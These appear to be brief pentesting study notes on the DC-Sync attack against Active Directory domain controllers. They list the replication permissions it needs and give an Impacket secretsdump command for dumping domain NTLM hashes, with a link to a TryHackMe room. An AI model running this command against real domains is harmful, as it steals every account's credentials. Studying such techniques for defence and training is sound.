DC-Sync attack is direct attack on the DC from an account with necessary permissions to force the DC to Synchronise itself with another existent or non-existent -  permissions required:
- ReplicatingDirectory Changes
- ReplicatingDirectory Changes All
- Replicating Directory Changes in Filtered Set

With [[Impacket-Cheatsheet]]
```bash
secretsdump -just-dc $domain/$user@$DC-ip
# For just ntlms 
-just-dc-ntlm 
```

[DC-Sync](https://tryhackme.com/room/credharvesting)